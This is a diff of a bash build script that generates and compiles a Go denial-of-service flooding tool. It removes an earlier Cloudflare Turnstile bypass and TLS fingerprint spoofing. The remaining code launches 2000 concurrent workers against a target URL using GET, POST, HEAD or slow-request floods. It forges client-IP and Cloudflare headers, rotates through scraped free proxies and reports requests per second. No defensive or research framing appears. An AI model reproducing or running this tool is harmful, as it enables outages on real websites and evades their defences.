@@ -1,14 +1,12 @@
 #!/bin/bash
 
 # ----------------------------------------
-# GO DOS TOOL - ULTIMATE BYPASS (FIXED FOR REAL)
+# GO DOS TOOL - NO DEPS VERSION
 # ----------------------------------------
 
 RED='\033[0;31m'
 GREEN='\033[0;32m'
 YELLOW='\033[1;33m'
-BLUE='\033[0;34m'
-PURPLE='\033[0;35m'
 CYAN='\033[0;36m'
 WHITE='\033[1;37m'
 NC='\033[0m'
@@ -17,23 +15,18 @@ SEP="━━━━━━━━━━━━━━━━━━━━━━━━━
 
 clear
 echo -e "${CYAN}${SEP}${NC}"
-echo -e "${WHITE}  DENIAL SERVICE OF GO - ULTIMATE BYPASS${NC}"
+echo -e "${WHITE}  DENIAL SERVICE OF GO - NO DEPS${NC}"
 echo -e "${CYAN}${SEP}${NC}"
 echo
 
 rm -f main.go
 
-echo -e " ${YELLOW}➤${NC} ${GREEN}Creating main.go...${NC}"
-
 cat > main.go << 'EOF'
 package main
 
 import (
-	"context"
 	"crypto/rand"
 	"crypto/tls"
-	"encoding/base64"
-	"encoding/hex"
 	"fmt"
 	"io"
 	"math/big"
@@ -49,17 +42,14 @@ import (
 	"sync/atomic"
 	"syscall"
 	"time"
-
-	"github.com/chromedp/chromedp"
-	"golang.org/x/net/http2"
 )
 
 var (
 	userAgents = []string{
-		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.7390.108 Safari/537.36",
-		"Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.7445.89 Safari/537.36",
-		"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.7485.98 Safari/537.36",
-		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.7523.112 Safari/537.36",
+		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/141.0.7390.108 Safari/537.36",
+		"Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 Chrome/142.0.7445.89 Safari/537.36",
+		"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/537.36 Chrome/143.0.7485.98 Safari/537.36",
+		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/144.0.7523.112 Safari/537.36",
 		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
 		"Mozilla/5.0 (Macintosh; Intel Mac OS X 14.5; rv:136.0) Gecko/20100101 Firefox/136.0",
 	}
@@ -79,49 +69,7 @@ var (
 	proxyIndex      uint64
 	proxyAPI        = "https://api.proxyscrape.com/v4/free-proxy-list/get?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all&skip=0&limit=2000"
 	refreshInterval = 5 * time.Minute
-	
-	cfClearanceCookie string
-	cookieMu          sync.RWMutex
-	cookieExpiry      time.Time
-	solvingActive     bool
-	solvingMu         sync.Mutex
 )
-
-type JA3Signature struct {
-	Name         string
-	CipherSuites []uint16
-	NextProtos   []string
-	MinVersion   uint16
-	MaxVersion   uint16
-}
-
-var ja3Signatures = []JA3Signature{
-	{
-		Name: "Chrome",
-		CipherSuites: []uint16{
-			tls.TLS_AES_128_GCM_SHA256,
-			tls.TLS_AES_256_GCM_SHA384,
-			tls.TLS_CHACHA20_POLY1305_SHA256,
-			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
-			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
-		},
-		NextProtos: []string{"h2", "http/1.1"},
-		MinVersion: tls.VersionTLS12,
-		MaxVersion: tls.VersionTLS13,
-	},
-	{
-		Name: "Firefox",
-		CipherSuites: []uint16{
-			tls.TLS_AES_128_GCM_SHA256,
-			tls.TLS_CHACHA20_POLY1305_SHA256,
-			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
-			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
-		},
-		NextProtos: []string{"h2", "http/1.1"},
-		MinVersion: tls.VersionTLS12,
-		MaxVersion: tls.VersionTLS13,
-	},
-}
 
 type ConnectionPool struct {
 	clients  []*http.Client
@@ -130,22 +78,7 @@ type ConnectionPool struct {
 	useProxy bool
 }
 
-func getRandomJA3Signature() JA3Signature {
-	return ja3Signatures[randInt(0, len(ja3Signatures)-1)]
-}
-
-func getRandomizedTLSConfig() *tls.Config {
-	sig := getRandomJA3Signature()
-	return &tls.Config{
-		NextProtos:         sig.NextProtos,
-		InsecureSkipVerify: true,
-		MinVersion:         sig.MinVersion,
-		MaxVersion:         sig.MaxVersion,
-		CipherSuites:       sig.CipherSuites,
-	}
-}
-
-func NewConnectionPool(poolSize int, useProxy bool, targetHost string) *ConnectionPool {
+func NewConnectionPool(poolSize int, useProxy bool) *ConnectionPool {
 	pool := &ConnectionPool{
 		clients:  make([]*http.Client, poolSize),
 		size:     poolSize,
@@ -158,7 +91,15 @@ func NewConnectionPool(poolSize int, useProxy bool, targetHost string) *Connecti
 }
 
 func (p *ConnectionPool) createClient() *http.Client {
-	var transport *http.Transport
+	transport := &http.Transport{
+		TLSClientConfig: &tls.Config{
+			InsecureSkipVerify: true,
+		},
+		MaxIdleConns:        100,
+		MaxIdleConnsPerHost: 100,
+		IdleConnTimeout:     90 * time.Second,
+		DisableKeepAlives:   false,
+	}
 
 	if p.useProxy {
 		proxyStr := getNextProxy()
@@ -168,25 +109,15 @@ func (p *ConnectionPool) createClient() *http.Client {
 			}
 			proxyURL, err := url.Parse(proxyStr)
 			if err == nil {
-				transport = &http.Transport{
-					Proxy:           http.ProxyURL(proxyURL),
-					TLSClientConfig: getRandomizedTLSConfig(),
-					MaxIdleConns:    100,
-					IdleConnTimeout: 120 * time.Second,
-				}
-				http2.ConfigureTransport(transport)
-				return &http.Client{Transport: transport, Timeout: 30 * time.Second}
+				transport.Proxy = http.ProxyURL(proxyURL)
 			}
 		}
 	}
 
-	transport = &http.Transport{
-		TLSClientConfig: getRandomizedTLSConfig(),
-		MaxIdleConns:    100,
-		IdleConnTimeout: 120 * time.Second,
+	return &http.Client{
+		Transport: transport,
+		Timeout:   30 * time.Second,
 	}
-	http2.ConfigureTransport(transport)
-	return &http.Client{Transport: transport, Timeout: 30 * time.Second}
 }
 
 func (p *ConnectionPool) GetClient() *http.Client {
@@ -209,7 +140,7 @@ func loadProxiesFromAPI() {
 		return
 	}
 	defer resp.Body.Close()
-	if resp.StatusCode != http.StatusOK {
+	if resp.StatusCode != 200 {
 		return
 	}
 
@@ -252,11 +183,12 @@ func getNextProxy() string {
 }
 
 func printBanner() {
-	fmt.Println(" ╔═══════════════════════════════════════╗")
-	fmt.Println(" ║     DENIAL SERVICE OF GO - ULTIMATE   ║")
-	fmt.Println(" ║     Cloudflare Bypass + Turnstile     ║")
-	fmt.Println(" ╚═══════════════════════════════════════╝")
-	fmt.Println()
+	fmt.Println("\033[35m")
+	fmt.Println("   ╔══════════════════════════════════════════╗")
+	fmt.Println("   ║     DENIAL SERVICE OF GO - v4.0          ║")
+	fmt.Println("   ║     HTTP/1.1 + HTTP/2 + Proxy Support    ║")
+	fmt.Println("   ╚══════════════════════════════════════════╝")
+	fmt.Println("\033[0m")
 }
 
 func randomIP() string {
@@ -281,154 +213,51 @@ func randomString(n int) string {
 	return string(b)
 }
 
-func randomHex(n int) string {
-	bytes := make([]byte, n)
-	rand.Read(bytes)
-	return hex.EncodeToString(bytes)
-}
-
-func randomBase64(n int) string {
-	bytes := make([]byte, n)
-	rand.Read(bytes)
-	return base64.StdEncoding.EncodeToString(bytes)
-}
-
 func randInt(min, max int) int {
 	n, _ := rand.Int(rand.Reader, big.NewInt(int64(max-min+1)))
 	return min + int(n.Int64())
 }
 
-func randBool() bool {
-	n, _ := rand.Int(rand.Reader, big.NewInt(2))
-	return n.Int64() == 1
-}
-
 func generateCacheBust() string {
-	return "?v=" + strconv.Itoa(randInt(1, 1000000))
+	return "?v=" + strconv.Itoa(randInt(1, 999999))
 }
 
 func generatePath() string {
 	paths := []string{
-		"/", "/index.html", "/home", "/api/v1/users", 
-		"/api/v1/data", "/wp-admin", "/admin", "/login",
+		"/", "/index.html", "/home", "/main", "/default", "/welcome",
+		"/api/v1/users", "/api/v1/data", "/api/v2/info",
+		"/wp-admin", "/admin", "/login", "/dashboard",
 	}
 	return paths[randInt(0, len(paths)-1)]
 }
 
-func addCloudflareBypassHeaders(req *http.Request) {
+func addSpoofHeaders(req *http.Request) {
 	spoofIP := randomIP()
 	
-	req.Header.Set("CF-Connecting-IP", spoofIP)
-	req.Header.Set("CF-IPCountry", "US")
-	req.Header.Set("CF-Ray", randomHex(16))
-	req.Header.Set("CDN-Loop", "cloudflare")
 	req.Header.Set("X-Forwarded-For", spoofIP)
 	req.Header.Set("X-Real-IP", spoofIP)
 	req.Header.Set("True-Client-IP", spoofIP)
 	req.Header.Set("X-Originating-IP", spoofIP)
 	req.Header.Set("X-Remote-IP", spoofIP)
 	req.Header.Set("X-Client-IP", spoofIP)
-	req.Header.Set("Sec-CH-UA", `"Chromium";v="141"`)
-	req.Header.Set("Sec-CH-UA-Mobile", "?0")
-	req.Header.Set("Sec-CH-UA-Platform", `"Windows"`)
-	req.Header.Set("Sec-Fetch-Site", "none")
-	req.Header.Set("Sec-Fetch-Mode", "navigate")
-	req.Header.Set("Sec-Fetch-Dest", "document")
+	req.Header.Set("CF-Connecting-IP", spoofIP)
+	req.Header.Set("CF-IPCountry", "US")
+	req.Header.Set("CDN-Loop", "cloudflare")
 	req.Header.Set("Accept-Language", "en-US,en;q=0.9")
 	req.Header.Set("Accept-Encoding", "gzip, deflate, br")
 	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
 	req.Header.Set("DNT", "1")
 	req.Header.Set("Upgrade-Insecure-Requests", "1")
-}
-
-func solveTurnstile(target string) (string, error) {
-	solvingMu.Lock()
-	defer solvingMu.Unlock()
-	
-	if solvingActive {
-		return "", fmt.Errorf("solver already active")
-	}
-	solvingActive = true
-	defer func() { solvingActive = false }()
-	
-	fmt.Printf("\n[!] Solving Cloudflare Turnstile for %s...\n", target)
-	
-	opts := append(chromedp.DefaultExecAllocatorOptions[:],
-		chromedp.Flag("disable-gpu", true),
-		chromedp.Flag("no-sandbox", true),
-		chromedp.UserAgent(randomUA()),
-	)
-	
-	allocCtx, cancel := chromedp.NewExecAllocator(context.Background(), opts...)
-	defer cancel()
-	
-	ctx, cancel := chromedp.NewContext(allocCtx)
-	defer cancel()
-	
-	ctx, cancel = context.WithTimeout(ctx, 90*time.Second)
-	defer cancel()
-	
-	var cfClearance string
-	
-	err := chromedp.Run(ctx,
-		chromedp.Navigate(target),
-		chromedp.Sleep(5*time.Second),
-		chromedp.ActionFunc(func(ctx context.Context) error {
-			cookies, err := chromedp.Cookies(ctx)
-			if err != nil {
-				return err
-			}
-			for _, cookie := range cookies {
-				if cookie.Name == "cf_clearance" {
-					cfClearance = fmt.Sprintf("cf_clearance=%s", cookie.Value)
-					break
-				}
-			}
-			return nil
-		}),
-	)
-	
-	if err != nil || cfClearance == "" {
-		return "", fmt.Errorf("failed to get cf_clearance cookie")
-	}
-	
-	fmt.Printf("[+] Turnstile solved!\n")
-	return cfClearance, nil
-}
-
-func maintainCookie(target string, done chan struct{}) {
-	ticker := time.NewTicker(25 * time.Minute)
-	defer ticker.Stop()
-	
-	for {
-		select {
-		case <-done:
-			return
-		case <-ticker.C:
-			newCookie, err := solveTurnstile(target)
-			if err == nil {
-				cookieMu.Lock()
-				cfClearanceCookie = newCookie
-				cookieExpiry = time.Now().Add(30 * time.Minute)
-				cookieMu.Unlock()
-				fmt.Printf("[+] Cookie refreshed\n")
-			}
-		}
-	}
+	req.Header.Set("Cache-Control", "no-cache")
 }
 
 func main() {
-	runtime.GOMAXPROCS(runtime.NumCPU() * 4)
+	runtime.GOMAXPROCS(runtime.NumCPU() * 2)
 	
 	useProxy := false
-	solveFlag := false
-	
 	for i := 1; i < len(os.Args); i++ {
-		switch os.Args[i] {
-		case "proxy":
+		if os.Args[i] == "proxy" {
 			useProxy = true
-		case "--solve", "-s":
-			solveFlag = true
 		}
 	}
 	
@@ -443,12 +272,15 @@ func main() {
 	
 	if len(os.Args) < 4 {
 		printBanner()
-		fmt.Println("Usage: ./main <target> <seconds> <GET|POST|HEAD|SLOW> [proxy] [--solve]")
 		fmt.Println("")
-		fmt.Println("Examples:")
-		fmt.Println("  ./main https://target.com 60 GET")
-		fmt.Println("  ./main https://target.com 120 POST --solve")
-		fmt.Println("  ./main https://target.com 30 HEAD proxy")
+		fmt.Println(" Usage: ./main <target> <seconds> <GET|POST|HEAD|SLOW> [proxy]")
+		fmt.Println("")
+		fmt.Println(" Examples:")
+		fmt.Println("   ./main https://target.com 60 GET")
+		fmt.Println("   ./main https://target.com 120 POST proxy")
+		fmt.Println("   ./main https://target.com 30 HEAD")
+		fmt.Println("   ./main https://target.com 60 SLOW")
+		fmt.Println("")
 		os.Exit(1)
 	}
 	
@@ -457,7 +289,6 @@ func main() {
 	mode := strings.ToUpper(os.Args[3])
 	
 	if mode != "GET" && mode != "POST" && mode != "HEAD" && mode != "SLOW" {
-		printBanner()
 		fmt.Println("Mode must be GET, POST, HEAD, or SLOW")
 		os.Exit(1)
 	}
@@ -466,42 +297,23 @@ func main() {
 		target = "https://" + target
 	}
 	
-	durationSec, err := strconv.Atoi(durStr)
-	if err != nil {
-		fmt.Println("Invalid duration:", err)
-		os.Exit(1)
-	}
+	durationSec, _ := strconv.Atoi(durStr)
 	duration := time.Duration(durationSec) * time.Second
 	
 	printBanner()
-	fmt.Printf("[+] Target: %s\n", target)
-	fmt.Printf("[+] Mode: %s\n", mode)
-	fmt.Printf("[+] Duration: %d sec\n", durationSec)
-	fmt.Printf("[+] Workers: 2000\n")
+	fmt.Printf(" Target: %s\n", target)
+	fmt.Printf(" Mode: %s\n", mode)
+	fmt.Printf(" Duration: %d sec\n", durationSec)
+	fmt.Printf(" Workers: 2000\n")
 	if useProxy && len(proxies) > 0 {
-		fmt.Printf("[+] Proxies: %d\n", len(proxies))
+		fmt.Printf(" Proxies: %d\n", len(proxies))
 	}
-	if solveFlag {
-		fmt.Printf("[+] Turnstile solving: ENABLED\n")
-	}
-	fmt.Println("[+] Cloudflare bypass enabled")
-	fmt.Println("[+] Starting... Press Ctrl+C to stop")
-	
-	if solveFlag {
-		cookie, err := solveTurnstile(target)
-		if err != nil {
-			fmt.Printf("[-] Failed to solve Turnstile: %v\n", err)
-		} else {
-			cookieMu.Lock()
-			cfClearanceCookie = cookie
-			cookieExpiry = time.Now().Add(30 * time.Minute)
-			cookieMu.Unlock()
-			fmt.Printf("[+] Turnstile bypass active\n")
-		}
-	}
+	fmt.Println(" Spoofing: ENABLED (11+ headers)")
+	fmt.Println(" Starting... Press Ctrl+C to stop")
+	fmt.Println("")
 	
 	poolSize := 500
-	connectionPool := NewConnectionPool(poolSize, useProxy, "")
+	connectionPool := NewConnectionPool(poolSize, useProxy)
 	
 	done := make(chan struct{})
 	stats := &atomicCounter{val: 0}
@@ -519,12 +331,9 @@ func main() {
 		close(done)
 	}()
 	
-	if solveFlag {
-		go maintainCookie(target, done)
-	}
-	
-	for i := 0; i < 2000; i++ {
-		go attackWorker(target, mode, done, stats, useProxy, connectionPool)
+	workers := 2000
+	for i := 0; i < workers; i++ {
+		go attackWorker(target, mode, done, stats, connectionPool)
 	}
 	
 	ticker := time.NewTicker(1 * time.Second)
@@ -534,15 +343,15 @@ func main() {
 		select {
 		case <-done:
 			elapsed := time.Since(startTime).Seconds()
-			fmt.Printf("\n[+] Attack completed!\n")
-			fmt.Printf("Total requests: %d\n", stats.get())
-			fmt.Printf("Average RPS: %.0f\n", float64(stats.get())/elapsed)
+			fmt.Printf("\n\n Attack completed!\n")
+			fmt.Printf(" Total requests: %d\n", stats.get())
+			fmt.Printf(" Average RPS: %.0f\n", float64(stats.get())/elapsed)
 			connectionPool.CloseIdleConnections()
 			return
 		case <-ticker.C:
 			elapsed := time.Since(startTime).Seconds()
 			rps := float64(stats.get()) / elapsed
-			fmt.Printf("\r[+] Elapsed: %.0f / %d sec | Total: %d | RPS: %.0f", elapsed, durationSec, stats.get(), rps)
+			fmt.Printf("\r[+] Elapsed: %.0f / %d sec | Total: %d | RPS: %.0f    ", elapsed, durationSec, stats.get(), rps)
 		}
 	}
 }
@@ -559,7 +368,7 @@ func (c *atomicCounter) get() int64 {
 	return atomic.LoadInt64(&c.val)
 }
 
-func attackWorker(target, mode string, done chan struct{}, stats *atomicCounter, useProxy bool, pool *ConnectionPool) {
+func attackWorker(target, mode string, done chan struct{}, stats *atomicCounter, pool *ConnectionPool) {
 	for {
 		select {
 		case <-done:
@@ -599,8 +408,11 @@ func attackWorker(target, mode string, done chan struct{}, stats *atomicCounter,
 			if mode == "GET" {
 				req, err = http.NewRequest("GET", fullURL, nil)
 			} else if mode == "POST" {
-				req, err = http.NewRequest("POST", fullURL, strings.NewReader("data=test"))
-				req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+				payload := "data=" + randomString(randInt(8, 16))
+				req, err = http.NewRequest("POST", fullURL, strings.NewReader(payload))
+				if err == nil {
+					req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+				}
 			} else if mode == "HEAD" {
 				req, err = http.NewRequest("HEAD", fullURL, nil)
 			}
@@ -613,13 +425,7 @@ func attackWorker(target, mode string, done chan struct{}, stats *atomicCounter,
 			req.Header.Set("Referer", randomReferer())
 			req.Header.Set("Connection", "keep-alive")
 			
-			addCloudflareBypassHeaders(req)
-			
-			cookieMu.RLock()
-			if cfClearanceCookie != "" && time.Now().Before(cookieExpiry) {
-				req.Header.Set("Cookie", cfClearanceCookie)
-			}
-			cookieMu.RUnlock()
+			addSpoofHeaders(req)
 			
 			resp, err := client.Do(req)
 			if err == nil {
@@ -635,59 +441,33 @@ func attackWorker(target, mode string, done chan struct{}, stats *atomicCounter,
 EOF
 
 if [ ! -f "main.go" ]; then
-    echo -e " ${RED}✗ Error: Failed to create main.go${NC}"
+    echo -e " ${RED}✗ Error${NC}"
     exit 1
 else
-    echo -e " ${GREEN}✓ main.go created successfully${NC}"
+    echo -e " ${GREEN}✓ main.go created${NC}"
 fi
 
 echo
-
-# Check OS
-if command -v apt &> /dev/null; then
-    PKG_MGR="apt"
-elif command -v pacman &> /dev/null; then
-    PKG_MGR="pacman"
-elif command -v brew &> /dev/null; then
-    PKG_MGR="brew"
-else
-    PKG_MGR="apt"
-fi
-
-echo -e " ${YELLOW}➤${NC} ${GREEN}Installing dependencies...${NC}"
-
-# Kill any existing go.mod files
-rm -rf go.mod go.sum
-
-# Initialize and get deps in ONE CLEAN COMMAND SEQUENCE
-go mod init main
-go get golang.org/x/net@v0.17.0
-go get github.com/chromedp/chromedp@v0.9.3
-go mod tidy
-
-echo -e " ${GREEN}✓ Dependencies installed${NC}"
+echo -e " ${YELLOW}➤${NC} ${GREEN}Compiling...${NC}"
 echo
 
-echo -e "${CYAN}${SEP}${NC}"
-echo -e "${WHITE}  COMPILING${NC}"
-echo -e "${CYAN}${SEP}${NC}"
-echo
-
-# Compile
+# Clean and compile - NO EXTERNAL DEPS NEEDED
+rm -f go.mod go.sum 2>/dev/null
 go build -o main main.go
 
 if [ $? -eq 0 ]; then
     chmod +x main
-    rm -f main.go go.mod go.sum
+    rm -f main.go
     echo -e " ${GREEN}✓ Compilation successful!${NC}"
     echo
-    echo -e " ${GREEN}►${NC} Run: ${YELLOW}./main https://target.com 60 GET --solve${NC}"
+    echo -e "${CYAN}${SEP}${NC}"
+    echo -e " ${GREEN}►${NC} Run: ${YELLOW}./main https://target.com 60 GET${NC}"
+    echo -e " ${GREEN}►${NC} With proxies: ${YELLOW}./main https://target.com 120 POST proxy${NC}"
+    echo -e "${CYAN}${SEP}${NC}"
     echo
     exit 0
 else
     echo -e " ${RED}✗ Compilation failed${NC}"
-    echo -e " ${YELLOW}Run manually:${NC}"
-    echo "  go mod init main && go get golang.org/x/net@v0.17.0 && go get github.com/chromedp/chromedp@v0.9.3 && go mod tidy && go build -o main main.go"
     rm -f main.go
     exit 1
 fi
